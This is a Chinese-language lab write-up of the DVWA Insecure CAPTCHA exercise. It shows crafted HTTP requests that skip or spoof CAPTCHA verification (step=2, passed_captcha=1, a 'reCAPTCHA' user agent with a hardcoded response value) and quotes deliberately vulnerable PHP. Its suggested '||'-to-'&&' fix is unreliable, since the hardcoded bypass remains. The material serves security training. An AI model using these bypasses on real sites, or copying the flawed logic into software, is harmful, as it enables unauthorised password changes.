---
layout: post
title: "DVWA Insecure CAPTCHA (教學用)"
description: ""
date: 2023-07-11
categories:
  - DVWA
  - DVWA_CAPTCHA
author: ""
tags: ['DVWA', 'CAPTCHA']
---



# DVWA Insecure CAPTCHA (教學用)
###### tags: `DVWA`



CAPTCHA 目的在於防止 網路爬蟲與機器人
## low


更改密碼的輸入點是post

BP 抓一下:
```http!
POST /vulnerabilities/captcha/ HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 79
Origin: http://localhost
Connection: close
Referer: http://localhost/vulnerabilities/captcha/
Cookie: PHPSESSID=37129a3245fd115d691aa1340ab627ed; security=low
Upgrade-Insecure-Requests: 1

step=1&password_new=1111&password_conf=1111&g-recaptcha-response=&Change=Change
```

改一下:
step=2

就能通過。

這題雖說是瞎猜得，不過還是來分析一下邏輯。


DVWA 推薦使用 google 的 CAPTCHA
圖片轉載來自:
https://www.cnblogs.com/augustine0654/p/17179711.html
![](https://hackmd.io/_uploads/B1vbP8m83.png)


驗證機制確實能夠防止大部份的機器人，不過要是邏輯出問題，就沒用了。



猜測一下，

用戶拿到 CAPTCHA 第一次送密碼 step=1

server 拿到 step=1 根google 要 驗證成功後 step=2



### code:
```php!
<?php

if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '1' ) ) {
    // Hide the CAPTCHA form
    $hide_form = true;

    // Get input
    $pass_new  = $_POST[ 'password_new' ];
    $pass_conf = $_POST[ 'password_conf' ];

    // Check CAPTCHA from 3rd party
    $resp = recaptcha_check_answer(
        $_DVWA[ 'recaptcha_private_key'],
        $_POST['g-recaptcha-response']
    );

    // Did the CAPTCHA fail?
    if( !$resp ) {
        // What happens when the CAPTCHA was entered incorrectly
        $html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";
        $hide_form = false;
        return;
    }
    else {
        // CAPTCHA was correct. Do both new passwords match?
        if( $pass_new == $pass_conf ) {
            // Show next stage for the user
            echo "
                <pre><br />You passed the CAPTCHA! Click the button to confirm your changes.<br /></pre>
                <form action=\"#\" method=\"POST\">
                    <input type=\"hidden\" name=\"step\" value=\"2\" />
                    <input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" />
                    <input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" />
                    <input type=\"submit\" name=\"Change\" value=\"Change\" />
                </form>";
        }
        else {
            // Both new passwords do not match.
            $html     .= "<pre>Both passwords must match.</pre>";
            $hide_form = false;
        }
    }
}

if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) {
    // Hide the CAPTCHA form
    $hide_form = true;

    // Get input
    $pass_new  = $_POST[ 'password_new' ];
    $pass_conf = $_POST[ 'password_conf' ];

    // Check to see if both password match
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );

        // Update database
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

        // Feedback for the end user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with the passwords matching
        echo "<pre>Passwords did not match.</pre>";
        $hide_form = false;
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```



### medium

這題我無法說明，因為我google capture 壞了，我無法抓到 passed_captcha 這個post字段。(可以看別人的教學)



### BP 抓包



多了一個g-recaptcha-response參數:

```htmlembedded!
<textarea id="g-recaptcha-response" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea>
```



```http!
POST /vulnerabilities/captcha/ HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 77
Origin: http://localhost
Connection: close
Referer: http://localhost/vulnerabilities/captcha/
Cookie: PHPSESSID=37129a3245fd115d691aa1340ab627ed; security=medium
Upgrade-Insecure-Requests: 1

step=1&password_new=111&password_conf=111&g-recaptcha-response=&Change=Change
```




### response:
```http!
GET /recaptcha/api2/anchor?ar=1&k=6LdOTVkhAAAAAC8b5TKhOmljy4P&co=aHR0cDovL2xvY2FsaG9zdDo4MA..&hl=zh-TW&v=CDFvp7CXAHw7k3HxO47Gm1O9&theme=dark&size=normal&cb=fzfaoj176y82 HTTP/2
Host: www.google.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://localhost/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: iframe
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Te: trailers


```
跳出 You have not passed the CAPTCHA.



step=2 多一個passed_captcha=1
```
POST /vulnerabilities/captcha/ HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 94
Origin: http://localhost
Connection: close
Referer: http://localhost/vulnerabilities/captcha/
Cookie: PHPSESSID=37129a3245fd115d691aa1340ab627ed; security=medium
Upgrade-Insecure-Requests: 1

step=2&password_new=111&password_conf=111&g-recaptcha-response=&Change=Change&passed_captcha=1
```
這題我無法成功說明，因為我google capture 壞了，我無法抓到 passed_captcha 這個字段。(可以看別人的教學)





## high

這題偏白盒:

```php!
<?php

if( isset( $_POST[ 'Change' ] ) ) {
    // Hide the CAPTCHA form
    $hide_form = true;

    // Get input
    $pass_new  = $_POST[ 'password_new' ];
    $pass_conf = $_POST[ 'password_conf' ];

    // Check CAPTCHA from 3rd party
    $resp = recaptcha_check_answer(
        $_DVWA[ 'recaptcha_private_key' ],
        $_POST['g-recaptcha-response']
    );

    if (
        $resp || 
        (
            $_POST[ 'g-recaptcha-response' ] == 'hidd3n_valu3'
            && $_SERVER[ 'HTTP_USER_AGENT' ] == 'reCAPTCHA'
        )
    ){
        // CAPTCHA was correct. Do both new passwords match?
        if ($pass_new == $pass_conf) {
            $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
            $pass_new = md5( $pass_new );

            // Update database
            $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "' LIMIT 1;";
            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

            // Feedback for user
            echo "<pre>Password Changed.</pre>";

        } else {
            // Ops. Password mismatch
            $html     .= "<pre>Both passwords must match.</pre>";
            $hide_form = false;
        }

    } else {
        // What happens when the CAPTCHA was entered incorrectly
        $html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";
        $hide_form = false;
        return;
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```


繞過關鍵:

```php!
if (
        $resp || 
        (
            $_POST[ 'g-recaptcha-response' ] == 'hidd3n_valu3'
            && $_SERVER[ 'HTTP_USER_AGENT' ] == 'reCAPTCHA'
        )
)
```

他應該是屬於邏輯漏洞

|| 改 && 這樣才對:
```php!
if (
        $resp && 
        (
            $_POST[ 'g-recaptcha-response' ] == 'hidd3n_valu3'
            && $_SERVER[ 'HTTP_USER_AGENT' ] == 'reCAPTCHA'
        )
)
```



改兩個地方:
1.User-Agent
2.post數據

改成:

```http!
POST /vulnerabilities/captcha/ HTTP/1.1
Host: localhost
User-Agent: reCAPTCHA
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 121
Origin: http://localhost
Connection: close
Referer: http://localhost/vulnerabilities/captcha/
Cookie: PHPSESSID=2f9c2085585d320a3a85d42a7e1a4566; security=high
Upgrade-Insecure-Requests: 1

step=1&password_new=666&password_conf=666&g-recaptcha-response=hidd3n_valu3&user_token=47165114b231519eaf29b252ef299a7e&Change=Change
```

可以繞過。

## impossible

code 關鍵點:
```
// Did the CAPTCHA fail?
if( !$resp ) {
    // What happens when the CAPTCHA was entered incorrectly
    echo "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";
    $hide_form = false;
}
else {
    // Check that the current password is correct
    $data = $db->prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );
    $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );
    $data->bindParam( ':password', $pass_curr, PDO::PARAM_STR );
    $data->execute();

    // Do both new password match and was the current password correct?
    if( ( $pass_new == $pass_conf) && ( $data->rowCount() == 1 ) ) {
        // Update the database
        $data = $db->prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' );
        $data->bindParam( ':password', $pass_new, PDO::PARAM_STR );
        $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );
        $data->execute();

        // Feedback for the end user - success!
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Feedback for the end user - failed!
        echo "<pre>Either your current password is incorrect or the new passwords did not match.<br />Please try again.</pre>";
        $hide_form = false;
    }
}
```
只要伺服器向 google驗證 返回 resp = 0 就直接失敗。